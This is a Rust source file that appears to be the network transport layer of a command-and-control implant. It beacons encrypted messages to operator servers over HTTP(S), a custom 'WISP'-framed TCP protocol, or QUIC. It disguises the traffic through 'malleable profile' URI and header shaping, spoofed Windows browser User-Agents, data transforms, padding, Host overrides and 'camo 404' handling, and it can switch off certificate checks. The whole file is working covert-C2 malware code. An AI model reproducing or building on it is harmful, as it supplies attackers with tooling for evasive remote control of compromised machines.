// Type1 transports: HTTP(s) shaped by the malleable profile, and raw TCP with
// the shared magic-framed packet format (shared/protocol/packet.go).
use base64::Engine;
use native_tls::TlsConnector;
use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use rsa::RsaPublicKey;
use serde::Deserialize;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::Arc;
use std::time::Duration;

use crate::crypto::parse_public_key;
use crate::envelope::{Envelope, MSG_PUBKEY};
use crate::profile::Profile;

pub(crate) const MAGIC: [u8; 4] = *b"WISP";
pub(crate) const MAX_PACKET: usize = 10 * 1024 * 1024;
const TYPE_REQUEST_KEY: u8 = 0x07;
const TYPE_SERVER_KEY: u8 = 0x08;
pub(crate) const TYPE_ENVELOPE: u8 = 0x09;
const DEFAULT_UA: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

pub enum Transport {
    Http(Http),
    Tcp(Tcp),
    #[cfg(feature = "quic")]
    Quic(crate::quic::Quic),
}

impl Transport {
    pub fn new(servers: &[String], profile: Profile, insecure: bool) -> Result<Self, String> {
        let mut http = Vec::new();
        let mut tcp = Vec::new();
        let mut quic = Vec::new();
        let mut kcp = false;
        for s in servers {
            if s.starts_with("http://") || s.starts_with("https://") {
                http.push(s.clone());
            } else if s.starts_with("tcp://") {
                tcp.push(s.clone());
            } else if s.starts_with("quic://") {
                quic.push(s.clone());
            } else if s.starts_with("kcp://") {
                kcp = true;
            } else {
                return Err(format!("transport: unsupported scheme in {s:?}"));
            }
        }
        if !http.is_empty() {
            return Ok(Self::Http(Http::new(http, profile, insecure)?));
        }
        if !tcp.is_empty() {
            return Ok(Self::Tcp(Tcp { servers: tcp }));
        }
        if !quic.is_empty() {
            #[cfg(feature = "quic")]
            {
                return Ok(Self::Quic(crate::quic::Quic::new(quic)?));
            }
            #[cfg(not(feature = "quic"))]
            {
                return Err("transport: quic:// requires the `quic` cargo feature (rebuild with --features quic)".into());
            }
        }
        if kcp {
            return Err("transport: kcp:// is not implemented in the Rust agent yet (use tcp:// or http://)".into());
        }
        Err("transport: no usable servers".into())
    }

    pub fn send(&self, env: &Envelope) -> Result<Envelope, String> {
        match self {
            Self::Http(h) => h.send(env),
            Self::Tcp(t) => t.exchange(env),
            #[cfg(feature = "quic")]
            Self::Quic(q) => q.exchange(env),
        }
    }

    pub fn pubkey(&self) -> Result<RsaPublicKey, String> {
        match self {
            Self::Http(h) => h.pubkey(),
            Self::Tcp(t) => t.pubkey(),
            #[cfg(feature = "quic")]
            Self::Quic(q) => q.pubkey(),
        }
    }
}

pub struct Http {
    servers: Vec<String>,
    profile: Profile,
    ua: String,
    agent: ureq::Agent,
}

impl Http {
    pub fn new(servers: Vec<String>, profile: Profile, insecure: bool) -> Result<Self, String> {
        let mut builder = ureq::AgentBuilder::new().timeout(Duration::from_secs(30));
        if insecure {
            let tls = TlsConnector::builder()
                .danger_accept_invalid_certs(true)
                .danger_accept_invalid_hostnames(true)
                .build()
                .map_err(|e| format!("tls: {e}"))?;
            builder = builder.tls_connector(Arc::new(tls));
        }
        let ua = profile.pick_ua();
        Ok(Self { servers, profile, ua, agent: builder.build() })
    }

    fn send(&self, env: &Envelope) -> Result<Envelope, String> {
        let mut last = String::from("transport: no servers configured");
        for base in &self.servers {
            match self.send_one(base, env) {
                Ok(v) => return Ok(v),
                Err(e) => last = e,
            }
        }
        Err(last)
    }

    fn send_one(&self, base: &str, env: &Envelope) -> Result<Envelope, String> {
        let mut url = format!("{}{}", base.trim_end_matches('/'), self.profile.pick_uri());
        let raw = self.profile.pad_envelope(&env.marshal());
        let (payload, transformed) = if self.profile.data_transform.is_empty() {
            (raw.clone(), false)
        } else {
            (self.profile.encode_data(&raw)?, true)
        };
        let slot_value = if transformed {
            String::from_utf8_lossy(&payload).into_owned()
        } else {
            base64::engine::general_purpose::STANDARD.encode(&payload)
        };
        let method = if self.profile.method.is_empty() { "POST" } else { &self.profile.method };
        let mut req = self.agent.request(method, &url);
        let mut body: Option<Vec<u8>> = None;
        if let Some(name) = self.profile.data.strip_prefix("header:") {
            req = req.set(name, &slot_value);
        } else if let Some(name) = self.profile.data.strip_prefix("param:") {
            let sep = if url.contains('?') { '&' } else { '?' };
            let encoded = utf8_percent_encode(&slot_value, NON_ALPHANUMERIC);
            url.push(sep);
            url.push_str(&format!("{name}={encoded}"));
            req = self.agent.request(method, &url);
        } else {
            body = Some(payload);
        }
        if !self.profile.host.is_empty() {
            req = req.set("Host", &self.profile.host);
        }

        if let Some(ua) = self
            .profile
            .ua_pool
            .first()
            .filter(|_| !self.ua.is_empty())
            .map(|_| self.ua.clone())
        {
            req = req.set("User-Agent", &ua);
        } else if self.ua.is_empty() {
            req = req.set("User-Agent", DEFAULT_UA);
        } else {
            req = req.set("User-Agent", &self.ua);
        }
        for h in &self.profile.headers {
            req = req.set(&h.key, &h.value.replace("{ua}", &self.ua));
        }

        let result = match body {
            Some(b) => req.set("Content-Type", "application/octet-stream").send_bytes(&b),
            None => req.call(),
        };
        let resp = match result {
            Ok(r) => r,
            Err(ureq::Error::Status(404, _)) => {
                return Err(format!("camo 404 from {url}"));
            }
            Err(ureq::Error::Status(code, r)) => {
                let body = read_body(r);
                return Err(format!("transport: HTTP {code}: {}", String::from_utf8_lossy(&body)));
            }
            Err(e) => return Err(format!("transport: {e}")),
        };
        let body = read_body(resp);
        self.profile.parse_response(&body)
    }

    fn pubkey(&self) -> Result<RsaPublicKey, String> {
        let env = Envelope::plain(MSG_PUBKEY, "", serde_json::Value::Null);
        let resp = self.send(&env)?;
        #[derive(Deserialize)]
        struct PubkeyInfo {
            #[serde(default)]
            pem: String,
        }
        let info: PubkeyInfo = serde_json::from_value(resp.d.unwrap_or_default())
            .map_err(|e| format!("pubkey response: {e}"))?;
        parse_public_key(&info.pem)
    }
}

fn read_body(resp: ureq::Response) -> Vec<u8> {
    let mut out = Vec::new();
    let _ = resp.into_reader().take(8 * 1024 * 1024).read_to_end(&mut out);
    out
}

pub struct Tcp {
    servers: Vec<String>,
}

impl Tcp {
    fn dial(&self) -> Result<TcpStream, String> {
        let mut last = String::from("transport: no servers");
        for s in &self.servers {
            let addr = s.trim_start_matches("tcp://");
            let socks = match addr.to_socket_addrs() {
                Ok(v) => v,
                Err(e) => {
                    last = format!("resolve {addr}: {e}");
                    continue;
                }
            };
            for sa in socks {
                match TcpStream::connect_timeout(&sa, Duration::from_secs(10)) {
                    Ok(c) => {
                        let _ = c.set_read_timeout(Some(Duration::from_secs(30)));
                        let _ = c.set_write_timeout(Some(Duration::from_secs(30)));
                        let _ = c.set_nodelay(true);
                        return Ok(c);
                    }
                    Err(e) => last = format!("connect {addr}: {e}"),
                }
            }
        }
        Err(last)
    }

    fn exchange(&self, env: &Envelope) -> Result<Envelope, String> {
        let mut conn = self.dial()?;
        write_packet(&mut conn, TYPE_ENVELOPE, &env.marshal())?;
        let (typ, payload) = read_packet(&mut conn)?;
        if typ != TYPE_ENVELOPE {
            return Err(format!("transport: unexpected packet type {typ:#x}"));
        }
        serde_json::from_slice(&payload).map_err(|e| format!("envelope: {e}"))
    }

    fn pubkey(&self) -> Result<RsaPublicKey, String> {
        let mut conn = self.dial()?;
        write_packet(&mut conn, TYPE_REQUEST_KEY, &[])?;
        let (typ, payload) = read_packet(&mut conn)?;
        if typ != TYPE_SERVER_KEY {
            return Err(format!("transport: unexpected key packet {typ:#x}"));
        }
        parse_public_key(&String::from_utf8_lossy(&payload))
    }
}

fn write_packet(w: &mut impl Write, typ: u8, payload: &[u8]) -> Result<(), String> {
    let mut hdr = [0u8; 9];
    hdr[0..4].copy_from_slice(&MAGIC);
    hdr[4..8].copy_from_slice(&(payload.len() as u32).to_le_bytes());
    hdr[8] = typ;
    w.write_all(&hdr).map_err(|e| e.to_string())?;
    w.write_all(payload).map_err(|e| e.to_string())?;
    w.flush().map_err(|e| e.to_string())
}

fn read_packet(r: &mut impl Read) -> Result<(u8, Vec<u8>), String> {
    let mut hdr = [0u8; 9];
    r.read_exact(&mut hdr).map_err(|e| format!("read header: {e}"))?;
    if hdr[0..4] != MAGIC {
        return Err(format!("invalid magic: {:x?}", &hdr[0..4]));
    }
    let size = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]) as usize;
    if size > MAX_PACKET {
        return Err(format!("packet too large: {size}"));
    }
    let mut payload = vec![0u8; size];
    r.read_exact(&mut payload).map_err(|e| format!("read payload: {e}"))?;
    Ok((hdr[8], payload))
}

pub fn is_camo_404(err: &str) -> bool {
    err.contains("camo 404")
}
